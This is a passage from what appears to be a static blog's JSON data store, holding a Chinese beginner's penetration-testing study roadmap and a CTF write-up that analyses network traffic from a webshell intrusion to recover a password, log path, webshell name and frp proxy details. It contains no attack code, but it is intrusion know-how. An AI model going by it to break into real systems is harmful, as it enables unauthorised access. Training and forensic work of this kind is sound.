https://www.hackthebox.com/\n\n\n\n搭建自己的军火库🧰：\n1. chorme插件 https://zhuanlan.zhihu.com/p/257021053\n2. 翻墙🧱： v2ray或者clashforwindows +✈️机场（点到为止）\n3. 渗透工具:自己囤一囤，~~肖佬说:(不行就自己开一个)。~~\n4. 武装bp：\n\t\t\t\t1.  https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg\n\t\t\t\t2. https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg\n\t\t\t\t3. https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g\n5. 安装kali： https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin  ~~（肖佬说： “算了，我自己写一篇吧”）~~\n\n\n\n\n\n## 学习资源\n\n社区：\n1. 先知社区： https://xz.aliyun.com/\n2. 网安：         https://www.wangan.com/\n3. freebuf:       https://www.freebuf.com/\n4. 奇安信攻防社区： https://forum.butian.net/\n\n导航：\n1. 黑客街： https://www.hackjie.com/\n\n公众号： \n1. 鹏组安全\n2. 菜鸟学信安\n3. 李白你好\n\n参考文章：\nhttps://blog.csdn.net/qq_28205153/article/details/123941798\nhttps://cloud.tencent.com/developer/article/2102308\n\n\n# 写在最后\n* 建议0基础的同学先从web简单开发开始学。\n\n* 注意⚠️：每个阶段标注的时间可以理解为我乱写的，实际上有很多碎的东西需要去学，还有一些知识看起来东西很多，但是实际时间花销其实不多，所以时间上出入较大，不必理会。\n\n* 找到适合自己的学习路线和方式\n\n* 使用ai提高效率","source":"_posts/渗透测试入门.md","raw":"---\ntitle: 渗透测试入门\ndate: 2023-08-20 16:18:48\ntags: \n- 渗透测试\n- 入门\ncategories:  \n- 渗透测试\n---\n#入门\n\n练习时长：八周（3又五分之一坤周）\n\n# web开发入门（两周）\n\n**前端语言**:  HTML+CSS+javascript\n建议时长： 三天 （JS要求高，dom树看懂）\n\n**脚本语言** : python+网络基础和HTTP协议  \n建议时长：七天 \n\n**后端语言**:PHP+SQL+MySQL数据库 \n建议时长：三天（第一门后端语言建议php，因为比较简单，当然你也可以直接入手其他的语言java，go之类的）\n\n**学习方式**： 菜鸟教程进行速通上面的语言学习。\n\n**学习任务**：注册登录页面和登录成功展示静态百度页面\n\n\n# web渗透入门\n\n\n## 一、信息收集（三天）\n如子域名收集、备案查询、github 敏感信息查找等等，知道的方式越多，收集的信息也越多。\n详细文章： https://www.freebuf.com/articles/web/340195.html \n\n利用一些工具减轻工作量：\n1. 灯塔ARL   https://github.com/TophantTechnology/ARL\n魔改： https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw\n2. 水泽  https://github.com/0x727/ShuiZe_0x727\n\n\n## 二、常见漏洞利用（三周）\n对于入门级的渗透测试，可以先掌握 OWASP Top 10 的漏洞、如最常见的 SQL 注入漏洞、XSS 漏洞、文件上传漏洞、越权漏洞、弱口令等。\n\n看一些报告：\nedusrc:闲鱼上或者自己搜一搜，公众号也有很多文章\n乌云： https://wy.zone.ci/\nh1：同样建议搜一搜\n\n## 三、渗透测试常用工具使用。(两周)\n对于入门级的渗透测试，会使用 nmap、Burpsuite、Kali Linux 、sqlmap 就基本足够了。\n\n靶场：\n1. pikachu： https://github.com/zhuifengshaonianhanlu/pikachu\n2. vulhub： https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168896524816782425130413&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142^v88^control_2,239^v2^insert_chatgpt&utm_term=vulhub&spm=1018.2226.3001.4187 \n3. tryhackme: https://tryhackme.com/ (推荐)\n4. hackthebox： https://www.hackthebox.com/\n\n\n\n搭建自己的军火库🧰：\n1. chorme插件 https://zhuanlan.zhihu.com/p/257021053\n2. 翻墙🧱： v2ray或者clashforwindows +✈️机场（点到为止）\n3. 渗透工具:自己囤一囤，~~肖佬说:(不行就自己开一个)。~~\n4. 武装bp：\n\t\t\t\t1.  https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg\n\t\t\t\t2. https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg\n\t\t\t\t3. https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g\n5. 安装kali： https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin  ~~（肖佬说： “算了，我自己写一篇吧”）~~\n\n\n\n\n\n## 学习资源\n\n社区：\n1. 先知社区： https://xz.aliyun.com/\n2. 网安：         https://www.wangan.com/\n3. freebuf:       https://www.freebuf.com/\n4. 奇安信攻防社区： https://forum.butian.net/\n\n导航：\n1. 黑客街： https://www.hackjie.com/\n\n公众号： \n1. 鹏组安全\n2. 菜鸟学信安\n3. 李白你好\n\n参考文章：\nhttps://blog.csdn.net/qq_28205153/article/details/123941798\nhttps://cloud.tencent.com/developer/article/2102308\n\n\n# 写在最后\n* 建议0基础的同学先从web简单开发开始学。\n\n* 注意⚠️：每个阶段标注的时间可以理解为我乱写的，实际上有很多碎的东西需要去学，还有一些知识看起来东西很多，但是实际时间花销其实不多，所以时间上出入较大，不必理会。\n\n* 找到适合自己的学习路线和方式\n\n* 使用ai提高效率","slug":"渗透测试入门","published":1,"updated":"2023-08-22T03:28:59.522Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkzd000e1ao53f6r3vud","content":"<p>#入门</p>\n<p>练习时长：八周（3又五分之一坤周）</p>\n<h1 id=\"web开发入门（两周）\"><a href=\"#web开发入门（两周）\" class=\"headerlink\" title=\"web开发入门（两周）\"></a>web开发入门（两周）</h1><p><strong>前端语言</strong>:  HTML+CSS+javascript<br>建议时长： 三天 （JS要求高，dom树看懂）</p>\n<p><strong>脚本语言</strong> : python+网络基础和HTTP协议<br>建议时长：七天 </p>\n<p><strong>后端语言</strong>:PHP+SQL+MySQL数据库<br>建议时长：三天（第一门后端语言建议php，因为比较简单，当然你也可以直接入手其他的语言java，go之类的）</p>\n<p><strong>学习方式</strong>： 菜鸟教程进行速通上面的语言学习。</p>\n<p><strong>学习任务</strong>：注册登录页面和登录成功展示静态百度页面</p>\n<h1 id=\"web渗透入门\"><a href=\"#web渗透入门\" class=\"headerlink\" title=\"web渗透入门\"></a>web渗透入门</h1><h2 id=\"一、信息收集（三天）\"><a href=\"#一、信息收集（三天）\" class=\"headerlink\" title=\"一、信息收集（三天）\"></a>一、信息收集（三天）</h2><p>如子域名收集、备案查询、github 敏感信息查找等等，知道的方式越多，收集的信息也越多。<br>详细文章： <a href=\"https://www.freebuf.com/articles/web/340195.html\">https://www.freebuf.com/articles/web/340195.html</a> </p>\n<p>利用一些工具减轻工作量：</p>\n<ol>\n<li>灯塔ARL   <a href=\"https://github.com/TophantTechnology/ARL\">https://github.com/TophantTechnology/ARL</a><br>魔改： <a href=\"https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw\">https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw</a></li>\n<li>水泽  <a href=\"https://github.com/0x727/ShuiZe_0x727\">https://github.com/0x727/ShuiZe_0x727</a></li>\n</ol>\n<h2 id=\"二、常见漏洞利用（三周）\"><a href=\"#二、常见漏洞利用（三周）\" class=\"headerlink\" title=\"二、常见漏洞利用（三周）\"></a>二、常见漏洞利用（三周）</h2><p>对于入门级的渗透测试，可以先掌握 OWASP Top 10 的漏洞、如最常见的 SQL 注入漏洞、XSS 漏洞、文件上传漏洞、越权漏洞、弱口令等。</p>\n<p>看一些报告：<br>edusrc:闲鱼上或者自己搜一搜，公众号也有很多文章<br>乌云： <a href=\"https://wy.zone.ci/\">https://wy.zone.ci/</a><br>h1：同样建议搜一搜</p>\n<h2 id=\"三、渗透测试常用工具使用。-两周\"><a href=\"#三、渗透测试常用工具使用。-两周\" class=\"headerlink\" title=\"三、渗透测试常用工具使用。(两周)\"></a>三、渗透测试常用工具使用。(两周)</h2><p>对于入门级的渗透测试，会使用 nmap、Burpsuite、Kali Linux 、sqlmap 就基本足够了。</p>\n<p>靶场：</p>\n<ol>\n<li>pikachu： <a href=\"https://github.com/zhuifengshaonianhanlu/pikachu\">https://github.com/zhuifengshaonianhanlu/pikachu</a></li>\n<li>vulhub： <a href=\"https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168896524816782425130413&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=vulhub&spm=1018.2226.3001.4187\">https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168896524816782425130413&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=vulhub&amp;spm=1018.2226.3001.4187</a> </li>\n<li>tryhackme: <a href=\"https://tryhackme.com/\">https://tryhackme.com/</a> (推荐)</li>\n<li>hackthebox： <a href=\"https://www.hackthebox.com/\">https://www.hackthebox.com/</a></li>\n</ol>\n<p>搭建自己的军火库🧰：</p>\n<ol>\n<li>chorme插件 <a href=\"https://zhuanlan.zhihu.com/p/257021053\">https://zhuanlan.zhihu.com/p/257021053</a></li>\n<li>翻墙🧱： v2ray或者clashforwindows +✈️机场（点到为止）</li>\n<li>渗透工具:自己囤一囤，<del>肖佬说:(不行就自己开一个)。</del></li>\n<li>武装bp：<br>         1.  <a href=\"https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg\">https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg</a><br>         2. <a href=\"https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg\">https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg</a><br>         3. <a href=\"https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g\">https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g</a></li>\n<li>安装kali： <a href=\"https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin\">https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin</a>  <del>（肖佬说： “算了，我自己写一篇吧”）</del></li>\n</ol>\n<h2 id=\"学习资源\"><a href=\"#学习资源\" class=\"headerlink\" title=\"学习资源\"></a>学习资源</h2><p>社区：</p>\n<ol>\n<li>先知社区： <a href=\"https://xz.aliyun.com/\">https://xz.aliyun.com/</a></li>\n<li>网安：         <a href=\"https://www.wangan.com/\">https://www.wangan.com/</a></li>\n<li>freebuf:       <a href=\"https://www.freebuf.com/\">https://www.freebuf.com/</a></li>\n<li>奇安信攻防社区： <a href=\"https://forum.butian.net/\">https://forum.butian.net/</a></li>\n</ol>\n<p>导航：</p>\n<ol>\n<li>黑客街： <a href=\"https://www.hackjie.com/\">https://www.hackjie.com/</a></li>\n</ol>\n<p>公众号： </p>\n<ol>\n<li>鹏组安全</li>\n<li>菜鸟学信安</li>\n<li>李白你好</li>\n</ol>\n<p>参考文章：<br><a href=\"https://blog.csdn.net/qq_28205153/article/details/123941798\">https://blog.csdn.net/qq_28205153/article/details/123941798</a><br><a href=\"https://cloud.tencent.com/developer/article/2102308\">https://cloud.tencent.com/developer/article/2102308</a></p>\n<h1 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h1><ul>\n<li><p>建议0基础的同学先从web简单开发开始学。</p>\n</li>\n<li><p>注意⚠️：每个阶段标注的时间可以理解为我乱写的，实际上有很多碎的东西需要去学，还有一些知识看起来东西很多，但是实际时间花销其实不多，所以时间上出入较大，不必理会。</p>\n</li>\n<li><p>找到适合自己的学习路线和方式</p>\n</li>\n<li><p>使用ai提高效率</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>#入门</p>\n<p>练习时长：八周（3又五分之一坤周）</p>\n<h1 id=\"web开发入门（两周）\"><a href=\"#web开发入门（两周）\" class=\"headerlink\" title=\"web开发入门（两周）\"></a>web开发入门（两周）</h1><p><strong>前端语言</strong>:  HTML+CSS+javascript<br>建议时长： 三天 （JS要求高，dom树看懂）</p>\n<p><strong>脚本语言</strong> : python+网络基础和HTTP协议<br>建议时长：七天 </p>\n<p><strong>后端语言</strong>:PHP+SQL+MySQL数据库<br>建议时长：三天（第一门后端语言建议php，因为比较简单，当然你也可以直接入手其他的语言java，go之类的）</p>\n<p><strong>学习方式</strong>： 菜鸟教程进行速通上面的语言学习。</p>\n<p><strong>学习任务</strong>：注册登录页面和登录成功展示静态百度页面</p>\n<h1 id=\"web渗透入门\"><a href=\"#web渗透入门\" class=\"headerlink\" title=\"web渗透入门\"></a>web渗透入门</h1><h2 id=\"一、信息收集（三天）\"><a href=\"#一、信息收集（三天）\" class=\"headerlink\" title=\"一、信息收集（三天）\"></a>一、信息收集（三天）</h2><p>如子域名收集、备案查询、github 敏感信息查找等等，知道的方式越多，收集的信息也越多。<br>详细文章： <a href=\"https://www.freebuf.com/articles/web/340195.html\">https://www.freebuf.com/articles/web/340195.html</a> </p>\n<p>利用一些工具减轻工作量：</p>\n<ol>\n<li>灯塔ARL   <a href=\"https://github.com/TophantTechnology/ARL\">https://github.com/TophantTechnology/ARL</a><br>魔改： <a href=\"https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw\">https://mp.weixin.qq.com/s/ITvbc9GwqGihUECfRv66Aw</a></li>\n<li>水泽  <a href=\"https://github.com/0x727/ShuiZe_0x727\">https://github.com/0x727/ShuiZe_0x727</a></li>\n</ol>\n<h2 id=\"二、常见漏洞利用（三周）\"><a href=\"#二、常见漏洞利用（三周）\" class=\"headerlink\" title=\"二、常见漏洞利用（三周）\"></a>二、常见漏洞利用（三周）</h2><p>对于入门级的渗透测试，可以先掌握 OWASP Top 10 的漏洞、如最常见的 SQL 注入漏洞、XSS 漏洞、文件上传漏洞、越权漏洞、弱口令等。</p>\n<p>看一些报告：<br>edusrc:闲鱼上或者自己搜一搜，公众号也有很多文章<br>乌云： <a href=\"https://wy.zone.ci/\">https://wy.zone.ci/</a><br>h1：同样建议搜一搜</p>\n<h2 id=\"三、渗透测试常用工具使用。-两周\"><a href=\"#三、渗透测试常用工具使用。-两周\" class=\"headerlink\" title=\"三、渗透测试常用工具使用。(两周)\"></a>三、渗透测试常用工具使用。(两周)</h2><p>对于入门级的渗透测试，会使用 nmap、Burpsuite、Kali Linux 、sqlmap 就基本足够了。</p>\n<p>靶场：</p>\n<ol>\n<li>pikachu： <a href=\"https://github.com/zhuifengshaonianhanlu/pikachu\">https://github.com/zhuifengshaonianhanlu/pikachu</a></li>\n<li>vulhub： <a href=\"https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168896524816782425130413&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=vulhub&spm=1018.2226.3001.4187\">https://blog.csdn.net/weixin_45744814/article/details/120185420?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168896524816782425130413%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168896524816782425130413&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120185420-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=vulhub&amp;spm=1018.2226.3001.4187</a> </li>\n<li>tryhackme: <a href=\"https://tryhackme.com/\">https://tryhackme.com/</a> (推荐)</li>\n<li>hackthebox： <a href=\"https://www.hackthebox.com/\">https://www.hackthebox.com/</a></li>\n</ol>\n<p>搭建自己的军火库🧰：</p>\n<ol>\n<li>chorme插件 <a href=\"https://zhuanlan.zhihu.com/p/257021053\">https://zhuanlan.zhihu.com/p/257021053</a></li>\n<li>翻墙🧱： v2ray或者clashforwindows +✈️机场（点到为止）</li>\n<li>渗透工具:自己囤一囤，<del>肖佬说:(不行就自己开一个)。</del></li>\n<li>武装bp：<br>         1.  <a href=\"https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg\">https://mp.weixin.qq.com/s/vGAOO0ZLXd55FTaGkiOILg</a><br>         2. <a href=\"https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg\">https://mp.weixin.qq.com/s/6VsFwJO4Q5T0AomngEh6Wg</a><br>         3. <a href=\"https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g\">https://mp.weixin.qq.com/s/zGtiHhA5udqQOps8nxu1-g</a></li>\n<li>安装kali： <a href=\"https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin\">https://blog.csdn.net/m0_72984458/article/details/131643173?utm_source=miniapp_weixin</a>  <del>（肖佬说： “算了，我自己写一篇吧”）</del></li>\n</ol>\n<h2 id=\"学习资源\"><a href=\"#学习资源\" class=\"headerlink\" title=\"学习资源\"></a>学习资源</h2><p>社区：</p>\n<ol>\n<li>先知社区： <a href=\"https://xz.aliyun.com/\">https://xz.aliyun.com/</a></li>\n<li>网安：         <a href=\"https://www.wangan.com/\">https://www.wangan.com/</a></li>\n<li>freebuf:       <a href=\"https://www.freebuf.com/\">https://www.freebuf.com/</a></li>\n<li>奇安信攻防社区： <a href=\"https://forum.butian.net/\">https://forum.butian.net/</a></li>\n</ol>\n<p>导航：</p>\n<ol>\n<li>黑客街： <a href=\"https://www.hackjie.com/\">https://www.hackjie.com/</a></li>\n</ol>\n<p>公众号： </p>\n<ol>\n<li>鹏组安全</li>\n<li>菜鸟学信安</li>\n<li>李白你好</li>\n</ol>\n<p>参考文章：<br><a href=\"https://blog.csdn.net/qq_28205153/article/details/123941798\">https://blog.csdn.net/qq_28205153/article/details/123941798</a><br><a href=\"https://cloud.tencent.com/developer/article/2102308\">https://cloud.tencent.com/developer/article/2102308</a></p>\n<h1 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h1><ul>\n<li><p>建议0基础的同学先从web简单开发开始学。</p>\n</li>\n<li><p>注意⚠️：每个阶段标注的时间可以理解为我乱写的，实际上有很多碎的东西需要去学，还有一些知识看起来东西很多，但是实际时间花销其实不多，所以时间上出入较大，不必理会。</p>\n</li>\n<li><p>找到适合自己的学习路线和方式</p>\n</li>\n<li><p>使用ai提高效率</p>\n</li>\n</ul>\n"},{"title":"陇剑杯 2021 misc webshell","date":"2023-08-23T14:17:32.000Z","_content":"## 陇剑杯 2021  webshell（问1）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客登录系统使用的密码是_____________。。得到的flag请使用NSSCTF{}格式提交。\n```\n\n题目描述说是登录系统，根据日常经验，一般登录操作使用的都是POST请求，于是我们直接在流量包中搜索POST请求看看。\n\n```\nhttp.request.method==POST\n```\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.32.34.png)\n然后追踪流看看，运气比较好第一个就是。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.35.35.png)\n交差下班。\n\n\n## 陇剑杯 2021webshell（问2）\n```\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客修改了一个日志文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF{}格式提交。\n```\n关键词：日志。直接搜索.log看看.\n发现东西有点多。\n需要再想个法子缩小范围。\n想到既然是通过挂马进行修改，那么看看他的🐎子是啥类型的，我们就可以通过请求类型进行进一步缩小范围。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.42.47.png)\n发现一列1.php，应该就是🐎子了，再看一眼确定没错，是post马子。\n\n然后就一个个看，第一个就是。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.49.21.png)\n但是发现只是相对路径，所以还要结合传马的位置拼接得到：\n`/var/www/html/data/Runtime/Logs/Home/21_08_07.log`\n\n\n\n## 陇剑杯 2021webshell（问3）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客获取webshell之后，权限是______？得到的flag请使用NSSCTF{}格式提交。\n```\n看到权限，可能会想到通过whoami这些命令进行过滤，但是出来的东西有点多。\n我们不妨直接猜一手，因为一般权限无非root 和www-data.\n得到是www-data\n\n## 陇剑杯 2021webshell（问4）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。\n```\n这一问就不用说了，前面就已经看出来1.php就是马子了。\n要是非问为啥，那原因就是看他流量特征，一眼蚁剑\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2023.04.38.png)\n\n<a href=\"https://www.freebuf.com/articles/network/204796.html\">常见webshell客户端流量特征</a>\n\n\n## 陇剑杯 2021webshell（问5）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客上传的代理工具客户端名字是_____________。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。\n```\n这里我一开始是想找上传的哪个数据包的，后来误打误撞发现了一个类似于 `ls` 命令的返回包。发现了frpc.ini\n于是直接就能得出就是frpc了。\n\n还有正常解法，就是看看比较大的包，大概率就是上传的包了。\n\n## 陇剑杯 2021webshell（问6）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客代理工具的回连服务端IP是_____________。得到的flag请使用NSSCTF{}格式提交。\n\n开启环境0\n```\n这题我目前也不是很清楚，最后找到frpc.ini文件的时候是需要hex解码的。\n最后就得到反连的ip是192.168.239.123\n## 陇剑杯 2021webshell（问7）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。得到的flag请使用NSSCTF{}格式提交。\n\n开启环境0\n```\n都在hex解密之后的frpc.ini中\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2000.16.24.png)\n","source":"_posts/陇剑杯 2021 misc webshell.md","raw":"---\ntitle: 陇剑杯 2021 misc webshell\ndate: 2023-08-23 22:17:32\ntags:\n- misc\n- 流量分析\ncategories:\n- ctf\n- writeup\n---\n## 陇剑杯 2021  webshell（问1）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客登录系统使用的密码是_____________。。得到的flag请使用NSSCTF{}格式提交。\n```\n\n题目描述说是登录系统，根据日常经验，一般登录操作使用的都是POST请求，于是我们直接在流量包中搜索POST请求看看。\n\n```\nhttp.request.method==POST\n```\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.32.34.png)\n然后追踪流看看，运气比较好第一个就是。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.35.35.png)\n交差下班。\n\n\n## 陇剑杯 2021webshell（问2）\n```\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客修改了一个日志文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF{}格式提交。\n```\n关键词：日志。直接搜索.log看看.\n发现东西有点多。\n需要再想个法子缩小范围。\n想到既然是通过挂马进行修改，那么看看他的🐎子是啥类型的，我们就可以通过请求类型进行进一步缩小范围。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.42.47.png)\n发现一列1.php，应该就是🐎子了，再看一眼确定没错，是post马子。\n\n然后就一个个看，第一个就是。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.49.21.png)\n但是发现只是相对路径，所以还要结合传马的位置拼接得到：\n`/var/www/html/data/Runtime/Logs/Home/21_08_07.log`\n\n\n\n## 陇剑杯 2021webshell（问3）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客获取webshell之后，权限是______？得到的flag请使用NSSCTF{}格式提交。\n```\n看到权限，可能会想到通过whoami这些命令进行过滤，但是出来的东西有点多。\n我们不妨直接猜一手，因为一般权限无非root 和www-data.\n得到是www-data\n\n## 陇剑杯 2021webshell（问4）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。\n```\n这一问就不用说了，前面就已经看出来1.php就是马子了。\n要是非问为啥，那原因就是看他流量特征，一眼蚁剑\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2023.04.38.png)\n\n<a href=\"https://www.freebuf.com/articles/network/204796.html\">常见webshell客户端流量特征</a>\n\n\n## 陇剑杯 2021webshell（问5）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客上传的代理工具客户端名字是_____________。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。\n```\n这里我一开始是想找上传的哪个数据包的，后来误打误撞发现了一个类似于 `ls` 命令的返回包。发现了frpc.ini\n于是直接就能得出就是frpc了。\n\n还有正常解法，就是看看比较大的包，大概率就是上传的包了。\n\n## 陇剑杯 2021webshell（问6）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客代理工具的回连服务端IP是_____________。得到的flag请使用NSSCTF{}格式提交。\n\n开启环境0\n```\n这题我目前也不是很清楚，最后找到frpc.ini文件的时候是需要hex解码的。\n最后就得到反连的ip是192.168.239.123\n## 陇剑杯 2021webshell（问7）\n```\n题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。得到的flag请使用NSSCTF{}格式提交。\n\n开启环境0\n```\n都在hex解密之后的frpc.ini中\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2000.16.24.png)\n","slug":"陇剑杯 2021 misc webshell","published":1,"updated":"2023-08-24T04:34:34.244Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkze000g1ao54w7yamyf","content":"<h2 id=\"陇剑杯-2021-webshell（问1）\"><a href=\"#陇剑杯-2021-webshell（问1）\" class=\"headerlink\" title=\"陇剑杯 2021  webshell（问1）\"></a>陇剑杯 2021  webshell（问1）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客登录系统使用的密码是_____________。。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>题目描述说是登录系统，根据日常经验，一般登录操作使用的都是POST请求，于是我们直接在流量包中搜索POST请求看看。</p>\n<pre><code>http.request.method==POST\n</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.32.34.png\"><br>然后追踪流看看，运气比较好第一个就是。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.35.35.png\"><br>交差下班。</p>\n<h2 id=\"陇剑杯-2021webshell（问2）\"><a href=\"#陇剑杯-2021webshell（问2）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问2）\"></a>陇剑杯 2021webshell（问2）</h2><pre><code>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客修改了一个日志文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>关键词：日志。直接搜索.log看看.<br>发现东西有点多。<br>需要再想个法子缩小范围。<br>想到既然是通过挂马进行修改，那么看看他的🐎子是啥类型的，我们就可以通过请求类型进行进一步缩小范围。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.42.47.png\"><br>发现一列1.php，应该就是🐎子了，再看一眼确定没错，是post马子。</p>\n<p>然后就一个个看，第一个就是。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.49.21.png\"><br>但是发现只是相对路径，所以还要结合传马的位置拼接得到：<br><code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code></p>\n<h2 id=\"陇剑杯-2021webshell（问3）\"><a href=\"#陇剑杯-2021webshell（问3）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问3）\"></a>陇剑杯 